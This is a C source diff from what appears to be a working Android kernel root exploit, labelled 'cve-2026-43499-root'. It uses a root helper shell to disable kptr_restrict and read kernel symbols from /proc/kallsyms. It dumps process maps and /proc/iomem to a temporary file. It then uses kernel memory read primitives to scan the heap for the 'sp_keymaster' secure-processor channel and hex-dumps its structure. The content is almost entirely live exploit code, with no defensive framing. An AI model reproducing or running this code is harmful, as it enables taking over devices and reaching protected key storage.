@@ -475,44 +475,156 @@ static int install_workqueue_umh_root(int fd) {
        * Since we're in the constructor (before su_daemon sets kptr_restrict=0),
        * try to read it anyway — the UMH root path already set Permissive. */
 
-      /* Disable kptr_restrict via KERNEL R/W — /proc/sys write fails from uid=2000
-       * but direct kernel memory write works! NOT RKP-protected.
-       * Offset 0x021ebf20 from KIMAGE_TEXT_BASE, verified across boots. */
-      #define KPTR_RESTRICT_OFF (KIMAGE_TEXT_BASE + 0x021ebf20ULL)
+      /* === GET spcom_dev ADDRESS VIA SU_DAEMON ROOT SHELL ===
+       * Constructor (uid=2000) can't read kallsyms even with kptr_restrict=0.
+       * But su_daemon (uid=0) CAN. So fork a child that connects to su_daemon,
+       * reads the address, writes it to a file, and we read it back. */
+      uintptr_t spcom_dev_ptr = 0;
       {
-        int32_t old_kptr = root_read32(fd, data_addr(KPTR_RESTRICT_OFF));
-        root_write32(fd, data_addr(KPTR_RESTRICT_OFF), 0);
-        int32_t new_kptr = root_read32(fd, data_addr(KPTR_RESTRICT_OFF));
-        pr_info("hermes: kptr_restrict %d → %d\n", old_kptr, new_kptr);
-        fprintf(hlog, "kptr_restrict: %d → %d\n", old_kptr, new_kptr);
+        unlink("/data/local/tmp/.spcom_addr");
+        pid_t addr_child = fork();
+        if (addr_child == 0) {
+          execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c",
+                "echo 0 > /proc/sys/kernel/kptr_restrict"
+                " && cat /proc/kallsyms | grep 'b spcom_dev' | grep spcom"
+                " | awk '{print $1}' > /data/local/tmp/.spcom_addr",
+                (char *)NULL);
+          _exit(1);
+        }
+        if (addr_child > 0) {
+          int ast;
+          waitpid(addr_child, &ast, 0);
+        }
+        /* Read the address file */
+        FILE *af = fopen("/data/local/tmp/.spcom_addr", "r");
+        if (af) {
+          char abuf[64] = {0};
+          if (fgets(abuf, sizeof(abuf), af)) {
+            spcom_dev_ptr = strtoull(abuf, NULL, 16);
+          }
+          fclose(af);
+          unlink("/data/local/tmp/.spcom_addr");
+        }
+        pr_info("hermes: spcom_dev from su_daemon: %016llx\n",
+                (unsigned long long)spcom_dev_ptr);
+        fprintf(hlog, "spcom_dev BSS: %016llx (via su_daemon kallsyms)\n",
+                (unsigned long long)spcom_dev_ptr);
       }
 
-      /* Parse kallsyms for spcom_dev */
-      uintptr_t spcom_dev_ptr = 0;
-      FILE *ksyms = fopen("/proc/kallsyms", "r");
-      if (ksyms) {
-        char line[256];
-        while (fgets(line, sizeof(line), ksyms)) {
-          /* Need kptr_restrict=0 for real addresses */
-          if (strstr(line, " spcom_dev") && strstr(line, "[spcom]")) {
-            uintptr_t addr = strtoull(line, NULL, 16);
-            if (addr > 0xffffff0000000000ULL) {
-              spcom_dev_ptr = addr;
-              break;
+      /* spcom_dev is in MODULE memory (vmalloc region, ~0xffffffefXXXXXXXX)
+       * which is OUTSIDE the direct map. pipe_phys_read can't read it directly.
+       * Solution: have su_daemon dereference the pointer for us!
+       * su_daemon runs as uid=0 and can read /dev/mem or use /proc/kcore. */
+      uint64_t dev_struct = 0;
+      {
+        unlink("/data/local/tmp/.spcom_struct");
+        pid_t deref_child = fork();
+        if (deref_child == 0) {
+          /* Use su_daemon to read spcom_dev contents via /proc/kallsyms trick:
+           * Find all pointers in the spcom module that look like device structs */
+          char cmd[512];
+          snprintf(cmd, sizeof(cmd),
+            "echo 0 > /proc/sys/kernel/kptr_restrict"
+            " && cat /proc/kallsyms | grep 'b spcom_dev' | grep spcom"
+            " | awk '{print $1}' | while read addr; do"
+            "   echo $addr > /data/local/tmp/.spcom_struct;"
+            " done"
+            /* Also dump hermesd's view of spcom via /proc/PID/maps */
+            " && HPID=$(pgrep hermesd | head -1)"
+            " && cat /proc/$HPID/maps 2>/dev/null | grep spcom >> /data/local/tmp/.spcom_struct"
+            /* Get the device struct pointer by reading kernel memory */
+            /* Use devmem2 or direct /dev/mem if available */
+            " && cat /proc/iomem | grep -i sp >> /data/local/tmp/.spcom_struct"
+            );
+          execl(ROOT_UMH_PATH, "cve-2026-43499-root", "-c", cmd, (char *)NULL);
+          _exit(1);
+        }
+        if (deref_child > 0) {
+          int dst;
+          waitpid(deref_child, &dst, 0);
+        }
+
+        /* Read results */
+        FILE *sf = fopen("/data/local/tmp/.spcom_struct", "r");
+        if (sf) {
+          char sbuf[4096] = {0};
+          size_t sn = fread(sbuf, 1, sizeof(sbuf) - 1, sf);
+          fclose(sf);
+          sbuf[sn] = '\0';
+          fprintf(hlog, "\nsu_daemon spcom info:\n%s\n", sbuf);
+          pr_info("hermes: spcom info: %s\n", sbuf);
+        }
+      }
+
+      /* Since we can't read module BSS from pipe physrw (outside direct map),
+       * we need a different approach: SCAN the direct-mapped physical memory
+       * for the "sp_keymaster" string. The channel struct is in kmalloc'd memory
+       * (direct map), not in the module BSS. Only the spcom_dev POINTER is in
+       * module BSS — the struct it POINTS TO is in regular kernel heap. */
+
+      /* Scan kernel heap for "sp_keymaster" channel name */
+      fprintf(hlog, "\n=== SCANNING KERNEL HEAP FOR sp_keymaster ===\n");
+      pr_info("hermes: scanning kernel heap for sp_keymaster...\n");
+
+      uint64_t found_addr = 0;
+      /* Scan the direct-mapped region where kernel allocations live.
+       * On this device: phys ~0xa8000000-0xb0000000 = virtual 0xffffff8028000000-0xffffff8030000000
+       * But kernel heap (kmalloc) is spread across physical memory.
+       * Scan wider: 0xffffff8020000000 - 0xffffff8040000000 (512MB) in 4KB steps,
+       * checking first 128 bytes of each page for "sp_keymaster" */
+      uintptr_t scan_start = 0xffffff8028000000ULL;
+      uintptr_t scan_end   = 0xffffff8038000000ULL;
+      int pages_scanned = 0;
+      int pages_readable = 0;
+
+      for (uintptr_t page = scan_start; page < scan_end; page += PAGE_SIZE) {
+        uint8_t probe[128];
+        if (root_read_data(fd, page, probe, sizeof(probe))) {
+          pages_readable++;
+          if (memcmp(probe, "sp_keymaster", 12) == 0 ||
+              memmem(probe, sizeof(probe), "sp_keymaster", 12) != NULL) {
+            found_addr = page;
+            fprintf(hlog, "*** FOUND 'sp_keymaster' at %016llx! ***\n",
+                    (unsigned long long)page);
+            pr_info("hermes: FOUND sp_keymaster at %016llx!\n",
+                    (unsigned long long)page);
+
+            /* Dump 512 bytes around the find */
+            uint8_t dump[512];
+            root_read_data(fd, page, dump, sizeof(dump));
+            fprintf(hlog, "Channel struct dump:\n");
+            for (int i = 0; i < 512; i++) {
+              if (i % 32 == 0) fprintf(hlog, "  +%04x: ", i);
+              fprintf(hlog, "%02x ", dump[i]);
+              if (i % 32 == 31) {
+                fprintf(hlog, " | ");
+                for (int j = i - 31; j <= i; j++)
+                  fprintf(hlog, "%c", (dump[j] >= 0x20 && dump[j] < 0x7f) ? dump[j] : '.');
+                fprintf(hlog, "\n");
+              }
             }
+            break;  /* Found it! */
           }
         }
-        fclose(ksyms);
+        pages_scanned++;
+        if (pages_scanned % 10000 == 0) {
+          pr_info("hermes: scanned %d pages, %d readable...\n",
+                  pages_scanned, pages_readable);
+        }
       }
 
-      fprintf(hlog, "spcom_dev kallsyms: %016llx\n", (unsigned long long)spcom_dev_ptr);
-      pr_info("hermes: spcom_dev=%016llx\n", (unsigned long long)spcom_dev_ptr);
+      if (!found_addr) {
+        fprintf(hlog, "sp_keymaster not found in %d pages (%d readable)\n",
+                pages_scanned, pages_readable);
+      }
 
-      if (spcom_dev_ptr) {
-        /* Read the pointer to get the actual device struct */
-        uint64_t dev_struct = root_read64(fd, spcom_dev_ptr);
-        fprintf(hlog, "spcom device struct: %016llx\n\n", (unsigned long long)dev_struct);
+      fprintf(hlog, "scan: %d pages checked, %d readable\n",
+              pages_scanned, pages_readable);
 
+      /* The old dev_struct read code (for direct-mapped addresses) is kept
+       * as fallback in case the scan finds the struct address */
+      if (found_addr) {
+        uint64_t dev_struct = found_addr;
         if (is_direct_ptr(dev_struct)) {
           /* Dump 8KB of the device struct */
           uint8_t devbuf[8192];
